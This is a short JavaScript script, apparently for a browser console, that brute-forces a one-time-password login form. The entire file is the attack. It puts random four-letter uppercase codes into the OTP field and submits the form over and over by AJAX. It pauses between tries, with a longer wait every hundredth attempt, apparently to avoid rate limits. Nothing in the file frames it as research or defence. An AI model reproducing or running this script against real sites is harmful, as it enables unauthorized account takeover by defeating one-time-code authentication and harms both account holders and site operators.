var alphabet = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'],
	indexMods = [0,0,0,0],
	comboLength = alphabet.length,
	count=0,
	possibleOutcomes = Math.pow(comboLength, 4); // 456976
var firstIndex = secondIndex = thirdIndex = fourthIndex = 0;
main();
function main(){
	// checkForJquery();
	createAndFillPassword();
	bruteforce();
}

function bruteforce(){
	var form = $( '#mbr-login-otp-form' );
	
	form.on('submit', function(e) {	
		e.preventDefault();
		
		var formData = $(this).serialize();
		var opts = {
			data: formData,
			method: 'POST',
			success: function(data){				
				if(count % 100 === 0){
					setTimeout(function(){
						attack();
					}, 10000);
				} else{
					setTimeout(function(){
						attack();
					}, 2000);
				}
			}
		};
		$.ajax(opts);
	});
	form.submit();
}

function attack(){
	createAndFillPassword();
	console.log(count);
	bruteforce();
}

function createAndFillPassword(){
	var passInput = $('#login-otp-passwd');
	var passGen = getNewCombo();
	passInput.val(passGen);
	count++;
}

function getNewCombo(){
	for(var i=0; i<indexMods.length; i++){
		indexMods[i] = Math.floor(Math.random()*26);
	}
	return createString();
}
function createString(){
	var finalString = '';
	for(var i=0; i<indexMods.length; i++){
		finalString += alphabet[indexMods[i]];
	}
	return finalString;
}